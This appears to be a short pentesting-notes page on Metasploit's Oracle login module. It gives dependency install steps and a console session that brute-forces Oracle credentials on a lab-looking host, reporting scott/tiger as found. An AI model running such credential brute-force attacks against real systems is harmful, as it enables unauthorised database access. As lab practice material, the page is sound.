# admin/oracle/oracle\_login

##  **Install Dependency: Ruby Gem ruby-oci8**

**Install other OS dependancies:**

```text
sudo apt install libgmp-dev
```

**Compile and install ruby-oci8**

```text
wget https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.1.8.zip
unzip ruby-oci8-2.1.8.zip
cd ruby-oci8-ruby-oci8-2.1.8/
```

```text
sudo su -
make
make install
gem install ruby-oci8
```

Restart Metasploit / computer.

## Run the Module

```text
msf5 > use admin/oracle/oracle_login
msf5 auxiliary(admin/oracle/oracle_login) > set RHOST 10.10.10.82
RHOST => 10.10.10.82
msf5 auxiliary(admin/oracle/oracle_login) > set SID XE
SID => XE
msf5 auxiliary(admin/oracle/oracle_login) > run -j
[*] Auxiliary module running as background job 0.

[*] Starting brute force on 10.10.10.82:1521...
[+] Found user/pass of: scott/tiger on 10.10.10.82 with sid XE
[*] Auxiliary module execution completed
```



